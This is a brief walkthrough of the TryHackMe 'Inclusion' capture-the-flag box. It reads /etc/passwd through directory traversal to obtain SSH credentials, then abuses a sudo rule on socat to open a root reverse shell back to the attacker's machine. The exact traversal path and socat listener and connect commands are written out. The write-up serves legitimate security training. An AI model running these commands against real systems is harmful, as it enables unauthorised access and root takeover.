# TryHackme Inclusion
**A beginner level LFI challenge**

* Before moving further I would recommend to gather some knowledge about Local File Inclusion and directory traversal.

## Task-2 Root It

* First enumerate the ip using nmap (*nmap ip*)

* Just go to the IP in browswer and type(*ip/../../../etc/passwd*) which is the default password file for linux. Now view the page source and you will find a user named 'falconfeast' and its password. These are creds for ssh which is open which we saw from nmap scan.

* Type (*ssh falconfeast@ip*) and then password to gain ssh shell. After that we are logged in to falconfeast. Type 'ls' to see its content and you will see a user.txt file. 'cat' it and you will have answer to your first question.

1. user flag<br>
Answer : 60989***************

* After that type 'sudo -l' to see the permissions of user. We see that user can run 'socat' which is SOcket CAT. Just gather some info about it which may help you in your future. You can go to https://gtfobins.github.io/gtfobins/socat/#reverse-shell to see the reverse shell for 'Socat'. On your machine type (*socat file:`tty`,raw,echo=0 tcp-listen:any_port*). On machine 'falconfeast' type (*RHOST='your_ip(tun0)'*)<br>(*RPORT='port_selected_on_your_machine'*)<br>sudo socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
You will see a shell on your local machine. Type 'whoami' to see the current user. It will show root. Now navigate to root using 'cd root/'. Type 'ls' to see for files and you will see root.txt file. See its content as it contains answer to the next question.

2. root flag <br>
Answer : 42964***************